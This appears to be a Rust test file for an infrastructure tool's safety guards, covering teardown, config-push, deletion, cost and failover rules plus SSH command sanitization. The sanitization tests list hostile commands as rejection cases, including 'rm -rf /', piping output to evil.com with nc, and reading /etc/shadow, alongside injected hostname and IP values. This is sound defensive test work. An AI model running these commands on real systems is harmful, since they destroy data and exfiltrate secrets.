//! Adversarial safety constraint tests for ClawOps Phase 5.
//!
//! These tests verify that the five hard safety rules from the PRD CANNOT be
//! bypassed, even when callers try to do so directly.
//!
//! PRD §6.1 Safety Rules:
//! 1. Never teardown ACTIVE PRIMARY without confirming STANDBY is ACTIVE.
//! 2. Never push config to > 100 instances without rolling validation.
//! 3. Never execute provider API deletes without audit log first.
//! 4. Cost spike > 20% requires explicit operator confirmation.
//! 5. Actions affecting > 10 users require explicit confirmation.

use chrono::Utc;
use claw_auth::InputSanitizer;
use claw_health::{
    FailoverState, FailoverStateMachine, FailoverTransition, HealthThresholds, MAX_HEAL_ATTEMPTS,
    verify_standby_precondition,
};
use claw_proto::{InstanceRole, InstanceState};

// ─── Safety Guard Helpers ─────────────────────────────────────────────────────
// These guard functions mirror what production code enforces.
// Tests prove these guards BLOCK unsafe operations.

/// Guard: teardown of an ACTIVE PRIMARY requires STANDBY to be ACTIVE.
///
/// Returns `Ok(())` if safe to proceed, `Err(reason)` if blocked.
fn guard_teardown_primary(
    instance_role: InstanceRole,
    instance_state: InstanceState,
    standby_state: Option<InstanceState>,
) -> Result<(), String> {
    if instance_role == InstanceRole::Primary && instance_state == InstanceState::Active {
        match standby_state {
            Some(InstanceState::Active) => Ok(()),
            Some(other) => Err(format!(
                "SAFETY: cannot teardown active primary — standby is {other:?}, not Active"
            )),
            None => Err(
                "SAFETY: cannot teardown active primary — no standby instance found".to_string(),
            ),
        }
    } else {
        // Not an active primary — no restriction
        Ok(())
    }
}

/// Guard: config push to more than 100 instances requires rolling validation flag.
///
/// Returns `Ok(batch_size)` if safe, `Err(reason)` if blocked.
fn guard_config_push_batch(instance_count: usize, rolling: bool) -> Result<usize, String> {
    if instance_count > 100 && !rolling {
        return Err(format!(
            "SAFETY: config push to {instance_count} instances requires rolling=true"
        ));
    }
    Ok(instance_count)
}

/// Guard: provider API delete requires a prior audit log entry for this resource.
///
/// Returns `Ok(())` if the audit log contains the required entry, `Err` otherwise.
fn guard_delete_requires_audit(audit_log_has_entry: bool, resource_id: &str) -> Result<(), String> {
    if !audit_log_has_entry {
        return Err(format!(
            "SAFETY: provider delete of '{resource_id}' requires audit log entry first"
        ));
    }
    Ok(())
}

/// Guard: cost spike above 20% requires explicit operator confirmation.
///
/// `previous_cost` and `new_cost` are monthly USD totals.
/// Returns `Ok(())` if within bounds or confirmed, `Err` if spike detected and not confirmed.
fn guard_cost_spike(previous_cost: f64, new_cost: f64, confirmed: bool) -> Result<(), String> {
    if previous_cost <= 0.0 {
        return Ok(()); // No baseline — cannot compute spike.
    }
    let change_pct = (new_cost - previous_cost) / previous_cost * 100.0;
    if change_pct > 20.0 && !confirmed {
        return Err(format!(
            "SAFETY: cost spike of {change_pct:.1}% (${previous_cost:.2} → ${new_cost:.2}) requires operator confirmation"
        ));
    }
    Ok(())
}

/// Guard: any operation affecting > 10 users requires explicit confirmation.
///
/// Returns `Ok(user_count)` if safe, `Err` if blocked.
fn guard_user_count(user_count: usize, confirmed: bool) -> Result<usize, String> {
    if user_count > 10 && !confirmed {
        return Err(format!(
            "SAFETY: operation affects {user_count} users (> 10) — requires explicit confirmation"
        ));
    }
    Ok(user_count)
}

// ─── Test: Teardown Safety ────────────────────────────────────────────────────

#[test]
fn test_cannot_teardown_active_primary_without_standby() {
    // Trying to teardown an ACTIVE PRIMARY with no standby → BLOCKED
    let result = guard_teardown_primary(
        InstanceRole::Primary,
        InstanceState::Active,
        None, // no standby
    );
    assert!(result.is_err(), "teardown without standby must be blocked");
    let msg = result.unwrap_err();
    assert!(msg.contains("SAFETY"), "error must cite safety rule");
    assert!(
        msg.contains("no standby"),
        "error must mention missing standby"
    );
}

#[test]
fn test_cannot_teardown_active_primary_with_degraded_standby() {
    // Standby exists but is DEGRADED → BLOCKED
    let result = guard_teardown_primary(
        InstanceRole::Primary,
        InstanceState::Active,
        Some(InstanceState::Degraded),
    );
    assert!(
        result.is_err(),
        "teardown with degraded standby must be blocked"
    );
    let msg = result.unwrap_err();
    assert!(
        msg.contains("Degraded"),
        "error must indicate standby state"
    );
}

#[test]
fn test_teardown_allowed_when_standby_is_active() {
    // STANDBY is ACTIVE → allowed
    let result = guard_teardown_primary(
        InstanceRole::Primary,
        InstanceState::Active,
        Some(InstanceState::Active),
    );
    assert!(
        result.is_ok(),
        "teardown with active standby must be allowed"
    );
}

#[test]
fn test_teardown_standby_never_blocked() {
    // Tearing down a STANDBY instance has no restrictions
    let result = guard_teardown_primary(
        InstanceRole::Standby,
        InstanceState::Active,
        None, // standby doesn't need its own standby
    );
    assert!(
        result.is_ok(),
        "standby teardown is always allowed by this guard"
    );
}

#[test]
fn test_verify_standby_precondition_used_by_health_engine() {
    // claw-health::verify_standby_precondition is the canonical check used
    // by the failover state machine — confirm it matches our expectations.
    assert!(verify_standby_precondition(InstanceState::Active));
    assert!(!verify_standby_precondition(InstanceState::Degraded));
    assert!(!verify_standby_precondition(InstanceState::Failed));
    assert!(!verify_standby_precondition(InstanceState::Unknown));
    assert!(!verify_standby_precondition(InstanceState::Bootstrapping));
}

// ─── Test: Config Push Batch Safety ──────────────────────────────────────────

#[test]
fn test_cannot_push_config_to_over_100_without_rolling() {
    // 101 instances, rolling = false → BLOCKED
    let result = guard_config_push_batch(101, false);
    assert!(
        result.is_err(),
        "push to 101 without rolling must be blocked"
    );
    let msg = result.unwrap_err();
    assert!(msg.contains("SAFETY"), "error must cite safety rule");
    assert!(msg.contains("101"), "error must include instance count");
    assert!(
        msg.contains("rolling"),
        "error must mention rolling requirement"
    );
}

#[test]
fn test_config_push_exactly_100_allowed_without_rolling() {
    // Exactly 100 is within limit
    let result = guard_config_push_batch(100, false);
    assert!(result.is_ok(), "push to exactly 100 must be allowed");
    assert_eq!(result.unwrap(), 100);
}

#[test]
fn test_config_push_over_100_allowed_with_rolling() {
    // 500 instances but rolling = true → allowed
    let result = guard_config_push_batch(500, true);
    assert!(result.is_ok(), "push to 500 with rolling must be allowed");
    assert_eq!(result.unwrap(), 500);
}

// ─── Test: Provider Delete Audit Safety ───────────────────────────────────────

#[test]
fn test_cannot_delete_provider_without_audit_log() {
    // No audit log entry for this resource → BLOCKED
    let result = guard_delete_requires_audit(false, "i-abc123");
    assert!(result.is_err(), "delete without audit log must be blocked");
    let msg = result.unwrap_err();
    assert!(msg.contains("SAFETY"), "error must cite safety rule");
    assert!(msg.contains("i-abc123"), "error must name the resource");
}

#[test]
fn test_delete_allowed_with_audit_log_entry() {
    // Audit log entry exists → allowed
    let result = guard_delete_requires_audit(true, "i-abc123");
    assert!(result.is_ok(), "delete with audit log must be allowed");
}

// ─── Test: Cost Spike Safety ──────────────────────────────────────────────────

#[test]
fn test_cost_spike_over_20_percent_requires_confirmation() {
    // $1000 → $1250 is a 25% spike without confirmation → BLOCKED
    let result = guard_cost_spike(1000.0, 1250.0, false);
    assert!(
        result.is_err(),
        "25% cost spike without confirmation must be blocked"
    );
    let msg = result.unwrap_err();
    assert!(msg.contains("SAFETY"), "error must cite safety rule");
    assert!(msg.contains("25.0%"), "error must include spike percentage");
}

#[test]
fn test_cost_spike_exactly_20_percent_is_allowed() {
    // Exactly 20% is within the threshold
    let result = guard_cost_spike(1000.0, 1200.0, false);
    assert!(result.is_ok(), "exactly 20% increase should be allowed");
}

#[test]
fn test_cost_spike_over_20_percent_allowed_with_confirmation() {
    // 25% spike but operator confirmed → allowed
    let result = guard_cost_spike(1000.0, 1250.0, true);
    assert!(result.is_ok(), "spike with confirmation must be allowed");
}

#[test]
fn test_cost_decrease_always_allowed() {
    // Cost went down — never needs confirmation
    let result = guard_cost_spike(1000.0, 800.0, false);
    assert!(result.is_ok(), "cost decrease must always be allowed");
}

// ─── Test: User Count Safety ──────────────────────────────────────────────────

#[test]
fn test_actions_affecting_over_10_users_require_confirmation() {
    // 11 users, no confirmation → BLOCKED
    let result = guard_user_count(11, false);
    assert!(
        result.is_err(),
        "action affecting 11 users without confirmation must be blocked"
    );
    let msg = result.unwrap_err();
    assert!(msg.contains("SAFETY"), "error must cite safety rule");
    assert!(msg.contains("11"), "error must include user count");
}

#[test]
fn test_actions_affecting_exactly_10_users_allowed() {
    // Exactly 10 users — no confirmation needed
    let result = guard_user_count(10, false);
    assert!(result.is_ok(), "10 users must not require confirmation");
    assert_eq!(result.unwrap(), 10);
}

#[test]
fn test_actions_affecting_over_10_users_allowed_with_confirmation() {
    // 50 users but confirmed → allowed
    let result = guard_user_count(50, true);
    assert!(result.is_ok(), "confirmed bulk action must be allowed");
    assert_eq!(result.unwrap(), 50);
}

// ─── Test: Failover State Machine Safety ──────────────────────────────────────

#[test]
fn test_failover_refuses_when_standby_not_active() {
    // Drive the state machine through MAX_HEAL_ATTEMPTS with standby NOT active
    // → must escalate to Commander, NOT initiate failover
    let mut fsm = FailoverStateMachine::new(
        "i-primary-1".to_string(),
        InstanceRole::Primary,
        HealthThresholds::default(),
    );

    // standby_active = false throughout
    fsm.transition(30, false); // attempt 1
    fsm.transition(25, false); // attempt 2
    fsm.transition(20, false); // attempt 3
    let t = fsm.transition(15, false); // exhausted

    assert!(
        matches!(t, FailoverTransition::EscalateToCommander { .. }),
        "exhausted heals with inactive standby must escalate, not failover — got {t:?}"
    );
    // State machine must be in Failed state
    assert!(
        matches!(fsm.state, FailoverState::Failed { .. }),
        "state must be Failed, not FailingOver — got {:?}",
        fsm.state
    );
}

#[test]
fn test_failover_proceeds_when_standby_is_active() {
    // With active standby, exhausted heals should trigger failover
    let mut fsm = FailoverStateMachine::new(
        "i-primary-2".to_string(),
        InstanceRole::Primary,
        HealthThresholds::default(),
    );

    fsm.transition(30, true); // attempt 1
    fsm.transition(25, true); // attempt 2
    fsm.transition(20, true); // attempt 3
    let t = fsm.transition(15, true); // exhausted with active standby

    assert!(
        matches!(t, FailoverTransition::InitiateFailover),
        "exhausted heals with active standby must trigger failover — got {t:?}"
    );
}

#[test]
fn test_standby_instance_never_self_failovers() {
    // A STANDBY that fails must escalate, not failover to itself
    let mut fsm = FailoverStateMachine::new(
        "i-standby-1".to_string(),
        InstanceRole::Standby,
        HealthThresholds::default(),
    );

    for _ in 0..MAX_HEAL_ATTEMPTS {
        fsm.transition(30, false);
    }
    let t = fsm.transition(15, false); // exhausted

    assert!(
        matches!(t, FailoverTransition::EscalateToCommander { .. }),
        "standby failure must escalate, not self-failover — got {t:?}"
    );
    // Must NOT enter FailingOver
    assert!(
        !matches!(fsm.state, FailoverState::FailingOver { .. }),
        "standby must never enter FailingOver state"
    );
}

// ─── Test: Max Heal Retries ───────────────────────────────────────────────────

#[test]
fn test_max_heal_retries_escalates_to_commander() {
    // The constant must be 3 (PRD requirement)
    assert_eq!(
        MAX_HEAL_ATTEMPTS, 3,
        "MAX_HEAL_ATTEMPTS must be exactly 3 per PRD"
    );

    let mut fsm = FailoverStateMachine::new(
        "i-heal-test".to_string(),
        InstanceRole::Primary,
        HealthThresholds::default(),
    );

    // Each of the 3 attempts must be AttemptDockerRestart
    let t1 = fsm.transition(30, false);
    assert!(matches!(
        t1,
        FailoverTransition::AttemptDockerRestart { attempt: 1 }
    ));

    let t2 = fsm.transition(25, false);
    assert!(matches!(
        t2,
        FailoverTransition::AttemptDockerRestart { attempt: 2 }
    ));

    let t3 = fsm.transition(20, false);
    assert!(matches!(
        t3,
        FailoverTransition::AttemptDockerRestart { attempt: 3 }
    ));

    // After 3 attempts, next tick must escalate (no active standby)
    let t4 = fsm.transition(15, false);
    assert!(
        matches!(t4, FailoverTransition::EscalateToCommander { .. }),
        "4th tick after 3 failed heals must escalate to Commander — got {t4:?}"
    );
}

#[test]
fn test_heal_recovery_before_max_retries_resets_cleanly() {
    // Instance recovers on attempt 2 — should not escalate
    let mut fsm = FailoverStateMachine::new(
        "i-partial-heal".to_string(),
        InstanceRole::Primary,
        HealthThresholds::default(),
    );

    fsm.transition(30, true); // attempt 1 — still sick
    let t = fsm.transition(90, true); // recovered before attempt 2

    assert!(
        matches!(t, FailoverTransition::LogRecovered),
        "early recovery must be logged as recovered — got {t:?}"
    );
}

// ─── Test: SSH Command Sanitization ──────────────────────────────────────────

#[test]
fn test_cannot_execute_shell_metacharacters_in_ssh_exec() {
    // Each of these must be REJECTED
    let malicious_commands = vec![
        "docker ps; rm -rf /",
        "ls && cat /etc/passwd",
        "uptime | nc evil.com 4444",
        "uname `whoami`",
        "date $(cat /etc/shadow)",
        "hostname > /tmp/exfil",
        "id < /dev/null",
        "ls (bad)",
        "ps {bad}",
        "df -h\nrm -rf /",
        "uptime\0evil",
    ];

    for cmd in &malicious_commands {
        let result = InputSanitizer::validate_command(cmd);
        assert!(
            result.is_err(),
            "malicious command must be rejected: {:?}",
            cmd
        );
    }
}

#[test]
fn test_allowlist_commands_pass_sanitization() {
    let safe_commands = vec![
        "docker ps",
        "systemctl status openclaw",
        "df -h",
        "free",
        "uptime",
        "journalctl",
        "hostname",
        "uname",
        "whoami",
        "date",
        "id",
    ];

    for cmd in &safe_commands {
        let result = InputSanitizer::validate_command(cmd);
        assert!(
            result.is_ok(),
            "safe command must pass sanitization: {:?}, error: {:?}",
            cmd,
            result.err()
        );
    }
}

#[test]
fn test_non_allowlist_commands_rejected_even_without_metacharacters() {
    // These have no metacharacters but are NOT in the allowlist
    let blocked = vec![
        "rm -rf /",
        "curl http://example.com",
        "python3 script.py",
        "bash exploit.sh",
        "wget http://malware.com",
        "ssh root@other-host",
    ];

    for cmd in &blocked {
        let result = InputSanitizer::validate_command(cmd);
        assert!(
            result.is_err(),
            "non-allowlist command must be rejected even without metacharacters: {:?}",
            cmd
        );
    }
}

#[test]
fn test_validate_hostname_adversarial() {
    // Attempt hostname injection patterns
    let long_hostname = "a".repeat(254);
    let bad_hostnames: Vec<&str> = vec![
        "",                         // empty
        "host; rm -rf /",           // semicolons
        long_hostname.as_str(),     // too long
        "-starts-with-hyphen.com",  // leading hyphen
        "ends-with-hyphen-.com",    // trailing hyphen
        "double..dots.com",         // consecutive dots
        "host_with_underscore.com", // underscore (not valid in hostnames)
    ];

    for hostname in &bad_hostnames {
        assert!(
            claw_auth::InputSanitizer::validate_hostname(hostname).is_err(),
            "bad hostname must be rejected: {:?}",
            hostname
        );
    }
}

#[test]
fn test_validate_ip_adversarial() {
    let bad_ips = vec![
        "",
        "256.256.256.256",
        "not.an.ip.address",
        "192.168.1.1; rm -rf /",
        "::ffff:999.999.999.999",
    ];

    for ip in &bad_ips {
        assert!(
            claw_auth::InputSanitizer::validate_ip(ip).is_err(),
            "bad IP must be rejected: {:?}",
            ip
        );
    }
}

// ─── Timestamp check ──────────────────────────────────────────────────────────

#[test]
fn test_tests_run_in_deterministic_utc() {
    // Sanity: Utc::now() is available and not panicking
    let now = Utc::now();
    assert!(now.timestamp() > 0);
}
